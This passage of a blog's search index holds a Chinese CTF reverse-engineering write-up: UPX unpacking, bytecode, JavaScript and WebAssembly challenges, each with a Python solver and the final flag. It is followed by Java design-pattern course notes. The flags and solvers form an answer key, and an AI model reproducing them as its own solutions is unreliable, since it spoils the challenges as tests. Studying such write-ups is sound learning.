<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第三届陕西省赛Rewp</title>
      <link href="/2023/06/09/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9BRewp/"/>
      <url>/2023/06/09/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9BRewp/</url>
      
        <content type="html"><![CDATA[        <h2 id="第三届陕西省赛-Reverse-WP"   >          <a href="#第三届陕西省赛-Reverse-WP" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三届陕西省赛-Reverse-WP" class="headerlink" title="第三届陕西省赛 Reverse WP"></a>第三届陕西省赛 Reverse WP</h2>              <h2 id="ezupx"   >          <a href="#ezupx" class="heading-link"><i class="fas fa-link"></i></a><a href="#ezupx" class="headerlink" title="ezupx"></a>ezupx</h2>      <p>估计抹掉了upx头，手脱</p><p>看到upx的标志，两个call ebp，加上里面还是VirtualProtect</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092123442.png" alt="image-20230609212359377"></p><p>那么后面的那个jump估计就是了，dump出来静态分析</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092145162.png" alt="image-20230609214509124"></p><p>迷宫题，迷宫长这样</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">***************</span><br><span class="line">*S000*0000000**</span><br><span class="line">*0**000*****0**</span><br><span class="line">*0*00*0*000*0**</span><br><span class="line">*000**0*0*0*0**</span><br><span class="line">*0***00*0*0*00*</span><br><span class="line">*0***0**0*0**0*</span><br><span class="line">*000*0*00*00*0*</span><br><span class="line">***0*0******0#*</span><br><span class="line">***0*00000000**</span><br><span class="line">*000********0**</span><br><span class="line">*0***00000*00**</span><br><span class="line">*0*0*****0**0**</span><br><span class="line">*0000000*00000*</span><br><span class="line">***************</span><br></pre></td></tr></table></div></figure><p>找到最短路径：RRRDRRURRRRRRDDDDRDDD</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ae2de0be8285f69db701d4dba8721a40&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="babypy"   >          <a href="#babypy" class="heading-link"><i class="fas fa-link"></i></a><a href="#babypy" class="headerlink" title="babypy"></a>babypy</h2>      <p>py字节码</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092149811.png" alt="image-20230609214901768"></p><p>在txt的最后还附上了密文</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=1nb0A3b7AUQwB3b84mQ/E0MvJUb+EXbx5TQwF3bt52bAZncsd9c</span><br></pre></td></tr></table></div></figure><p>大概就是将密文运算后base64加密后再进行字符串替换</p><p>但是不知道哪些是本来就有的那些是替换而来的，选择爆破flag</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = <span class="string">&quot;=1nb0A3b7AUQwB3b84mQ/E0MvJUb+EXbx5TQwF3bt52bAZncsd9c&quot;</span></span><br><span class="line"><span class="built_in">print</span>(f[::-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            x1 = <span class="string">&quot;cWdscnZAb25tb&quot;</span></span><br><span class="line">            x2 = <span class="string">&quot;FwQT5xbXE+bUJvM0E/Qm48b&quot;</span></span><br><span class="line">            x3 = <span class="string">&quot;BwQUA7b&quot;</span></span><br><span class="line">            x4 = <span class="string">&quot;A0bng=&quot;</span></span><br><span class="line">            <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">                x1 += <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x1 += <span class="string">&#x27;H&#x27;</span></span><br><span class="line">            x1 += x2</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> y == <span class="number">1</span>:</span><br><span class="line">                x1 += <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x1 += <span class="string">&#x27;H&#x27;</span></span><br><span class="line">            x1 += x3</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">1</span>:</span><br><span class="line">                x1 += <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x1 += <span class="string">&#x27;H&#x27;</span></span><br><span class="line">            x1 += x4</span><br><span class="line"></span><br><span class="line">            org = x1</span><br><span class="line">            f = base64.b64decode(<span class="built_in">bytes</span>(org.encode()))</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line">                x = f[i]</span><br><span class="line">                x = x - <span class="number">3</span></span><br><span class="line">                x = x ^ <span class="number">8</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(x), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br></pre></td></tr></table></div></figure><p>flag{5dcbafe63fbf3b7d8647c1aee650ae9c}</p>        <h2 id="BadCoffee"   >          <a href="#BadCoffee" class="heading-link"><i class="fas fa-link"></i></a><a href="#BadCoffee" class="headerlink" title="BadCoffee"></a>BadCoffee</h2>      <p>javaScript</p><p>丢进phpstudy跑</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092220046.png" alt="image-20230609222006019"></p><p>index.html</p><figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./BadCoffee.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure><p>直接动调</p><p>关键在于enc函数的两个for循环</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092224276.png" alt="image-20230609222426241"></p><p>在调试的过程中发现程序只进行了异或操作，那么直接跑完整个加密然后再把加密后的字符串和输入异或即可得到用于加密的key</p><p>判断：</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092226018.png" alt="image-20230609222654993"></p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入为 flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span></span><br><span class="line"><span class="comment"># 第一次循环的key</span></span><br><span class="line">enc1 = [<span class="number">233</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">238</span>, <span class="number">145</span>, <span class="number">144</span>, <span class="number">11</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">134</span>, <span class="number">243</span>, <span class="number">158</span>, <span class="number">197</span>, <span class="number">216</span>, <span class="number">111</span>, <span class="number">136</span>, <span class="number">152</span>, <span class="number">29</span>, <span class="number">204</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">228</span>, <span class="number">39</span>, <span class="number">148</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">220</span>, <span class="number">90</span>, <span class="number">76</span>, <span class="number">251</span>, <span class="number">57</span>, <span class="number">183</span>, <span class="number">184</span>, <span class="number">150</span>, <span class="number">157</span>, <span class="number">156</span>, <span class="number">176</span>, <span class="number">13</span>, <span class="number">41</span>, <span class="number">30</span>, <span class="number">86</span>, <span class="number">244</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次循环的key</span></span><br><span class="line">enc2 = [<span class="number">8</span>, <span class="number">244</span>, <span class="number">86</span>, <span class="number">30</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">176</span>, <span class="number">156</span>, <span class="number">157</span>, <span class="number">150</span>, <span class="number">184</span>, <span class="number">183</span>, <span class="number">57</span>, <span class="number">251</span>, <span class="number">76</span>, <span class="number">90</span>, <span class="number">220</span>, <span class="number">215</span>, <span class="number">148</span>, <span class="number">39</span>, <span class="number">228</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">204</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">152</span>, <span class="number">136</span>, <span class="number">111</span>, <span class="number">216</span>, <span class="number">197</span>, <span class="number">158</span>, <span class="number">243</span>, <span class="number">134</span>, <span class="number">87</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">144</span>, <span class="number">145</span>, <span class="number">238</span>, <span class="number">127</span>, <span class="number">129</span>, <span class="number">233</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取出来的密文</span></span><br><span class="line">flag = [<span class="number">135</span>, <span class="number">25</span>, <span class="number">72</span>, <span class="number">151</span>, <span class="number">195</span>, <span class="number">212</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">250</span>, <span class="number">101</span>, <span class="number">39</span>, <span class="number">77</span>, <span class="number">163</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">167</span>, <span class="number">119</span>, <span class="number">184</span>, <span class="number">7</span>, <span class="number">77</span>, <span class="number">144</span>, <span class="number">154</span>, <span class="number">93</span>, <span class="number">10</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">48</span>, <span class="number">179</span>, <span class="number">77</span>, <span class="number">71</span>, <span class="number">163</span>, <span class="number">67</span>, <span class="number">61</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">196</span>, <span class="number">136</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">128</span>, <span class="number">93</span>, <span class="number">84</span>, <span class="number">156</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc1)):</span><br><span class="line">    x = flag[i] ^ enc2[i] ^ enc1[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>flag{I_c0uld_neu3r_undeRstand_jvaVs3rIpt!}</p>        <h2 id="Web-amp-Assembly"   >          <a href="#Web-amp-Assembly" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web-amp-Assembly" class="headerlink" title="Web&amp;Assembly"></a>Web&amp;Assembly</h2>      <p>wasm题，jeb倒是能打开但是反编译依托答辩</p><p>推荐ghidra并使用wasm插件</p><p>项目地址：<span class="exturl"><a class="exturl__link"   href="https://github.com/nneonneo/ghidra-wasm-plugin" >https://github.com/nneonneo/ghidra-wasm-plugin</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>打开网址，题目已经给了足够的提示了</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092107124.png" alt="image-20230609210746035"></p><p>ghidra打开</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092112257.png" alt="image-20230609211248218"></p><p>直接将输入和enc输入check函数</p><p>分析check函数</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202306092114754.png" alt="image-20230609211442713"></p><p>主要是分为三部，最后再与enc进行比较</p><p>接下来分析dosomething函数</p><p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20230609211527542.png" alt="image-20230609211527542"></p><p>简单的异或，但是要注意，+法的优先级高于位运算</p><p>最后即可写出脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dosomerthing</span>(<span class="params">enc, a, b, c, d</span>):</span><br><span class="line">    enc[a] ^= (enc[b] + enc[d]) &amp; <span class="number">0xff</span></span><br><span class="line">    enc[b] ^= (enc[c] + enc[d]) &amp; <span class="number">0xff</span></span><br><span class="line">    enc[c] ^= (enc[a] + enc[b]) &amp; <span class="number">0xff</span></span><br><span class="line">    enc[d] ^= (enc[a] + enc[c]) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;114!514!&quot;</span></span><br><span class="line">e = <span class="string">&quot;91fba5ccfef6e0905eeeb47940d25543c286b10de778fbb268ab7580414c0758&quot;</span></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(e)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc), <span class="number">8</span>):</span><br><span class="line">    tmp = <span class="built_in">bytearray</span>(enc[i:i + <span class="number">8</span>])</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x72</span>):</span><br><span class="line">        tmp = dosomerthing(tmp, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>)</span><br><span class="line">        tmp = dosomerthing(tmp, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">        tmp = dosomerthing(tmp, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>)</span><br><span class="line">        tmp = dosomerthing(tmp, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        x = tmp[a] ^ key[a]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(x &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>flag{Y0u_Kn0w_W45M_n0w!!W0oO0ow}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面向对象高级编程上课笔记（EffectiveJava）</title>
      <link href="/2023/06/08/EffectiveJava%E4%B8%8A%E8%AF%BE%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/06/08/EffectiveJava%E4%B8%8A%E8%AF%BE%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[        <h1 id="第二章-创建和销毁对象"   >          <a href="#第二章-创建和销毁对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二章-创建和销毁对象" class="headerlink" title="第二章 创建和销毁对象"></a>第二章 创建和销毁对象</h1>              <h2 id="1-用静态工厂方法代替构造器"   >          <a href="#1-用静态工厂方法代替构造器" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-用静态工厂方法代替构造器" class="headerlink" title="1.用静态工厂方法代替构造器"></a>1.用静态工厂方法代替构造器</h2>      <p>Service Provider 框架</p><p>样例代码</p><p>接口</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    AnimalFactory <span class="title function_">newService</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>静态工厂</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnimalFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, Animal&gt; animals =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Animal&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_ANMIAL_NAME</span> <span class="operator">=</span> <span class="string">&quot;&lt;def&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">DefaultAnimal</span><span class="params">(Animal a)</span> &#123;</span><br><span class="line">        registerProvider(DEFAULT_ANMIAL_NAME, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerProvider</span><span class="params">(String name, Animal p)</span>&#123;</span><br><span class="line">        animals.put(name,p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> AnimalFactory <span class="title function_">newInstance</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        <span class="keyword">return</span> newInstance(DEFAULT_ANMIAL_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> AnimalFactory <span class="title function_">newInstance</span><span class="params">(String name)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> animals.get(name);</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalAccessException</span>(</span><br><span class="line">                    <span class="string">&quot;No provider registered with name: &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> a.newService();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>主函数</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        AnimalFactory.registerProvider(<span class="string">&quot;Cat&quot;</span>, Cat);</span><br><span class="line">        AnimalFactory.registerProvider(<span class="string">&quot;Dog&quot;</span>, Dog);</span><br><span class="line"></span><br><span class="line">        <span class="type">AnimalFactory</span> <span class="variable">Cat</span> <span class="operator">=</span> AnimalFactory.newInstance(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">AnimalFactory</span> <span class="variable">Dog</span> <span class="operator">=</span> AnimalFactory.newInstance(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(Cat);</span><br><span class="line">        System.out.println(Dog);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 注册对应的类 利用接口实现匿名内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Animal</span> <span class="variable">Cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> AnimalFactory <span class="title function_">newService</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AnimalFactory</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;This is Cat&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Animal</span> <span class="variable">Dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> AnimalFactory <span class="title function_">newService</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AnimalFactory</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;This is Dog&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="2-遇到多个构造器参数用构造器"   >          <a href="#2-遇到多个构造器参数用构造器" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-遇到多个构造器参数用构造器" class="headerlink" title="2.遇到多个构造器参数用构造器"></a>2.遇到多个构造器参数用构造器</h2>      <p>JavaBeans模式</p>        <h3 id="Builder模式"   >          <a href="#Builder模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#Builder模式" class="headerlink" title="Builder模式"></a>Builder模式</h3>      <p>适用于类层次结构</p><p>创建Builder对象引入额外开销</p><p>Person类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String mName;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> mAge;</span><br><span class="line">    <span class="keyword">public</span> String mLocation;</span><br><span class="line">    <span class="keyword">public</span> String mGender;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String mJob;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Builder</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Builder</span>&lt;T&gt;&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String mName;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> mAge;</span><br><span class="line">        <span class="keyword">private</span> String mLocation;</span><br><span class="line">        <span class="keyword">private</span> String mGender;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String mJob;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">Builder</span><span class="params">(String mName)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mName = mName;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">abstract</span> Person <span class="title function_">build</span><span class="params">()</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">abstract</span> T <span class="title function_">self</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">SetmAge</span><span class="params">(<span class="type">int</span> mAge)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mAge = mAge;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">SetmLocation</span><span class="params">(String mLocation)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mLocation = mLocation;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">SetmGender</span><span class="params">(String mGender)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mGender = mGender;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">SetmJob</span><span class="params">(String mJob)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mJob = mJob;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Person(Builder&lt;?&gt; builder) &#123;</span><br><span class="line">        <span class="built_in">this</span>.mAge = builder.mAge;</span><br><span class="line">        <span class="built_in">this</span>.mName = builder.mName;</span><br><span class="line">        <span class="built_in">this</span>.mGender = builder.mGender;</span><br><span class="line">        <span class="built_in">this</span>.mLocation = builder.mLocation;</span><br><span class="line">        <span class="built_in">this</span>.mJob = builder.mJob;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>Hight类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 